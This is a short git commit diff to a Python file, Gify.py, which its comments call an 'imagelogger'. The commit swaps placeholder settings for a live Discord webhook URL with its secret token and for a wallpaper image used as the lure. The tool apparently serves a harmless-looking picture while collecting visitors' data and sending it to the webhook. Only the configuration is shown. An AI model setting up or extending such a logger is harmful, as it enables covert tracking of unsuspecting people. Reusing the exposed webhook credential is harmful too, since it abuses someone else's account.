7b52a6898064ab00f0470aaf7604c23725f91652
T3hM4n <40773936+T3hM4n@users.noreply.github.com>
2025-09-28 07:24:42 -0400

    Update Gify.py

--- api/Gify.py
+++ api/Gify.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1421818439395311697/qnPLV-sFjxl-ar6r4IEvC60QJysmhkOKzo3tCAQGiTsMB2e5Gks8DtS3s-o7iWccpT4W",
+    "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
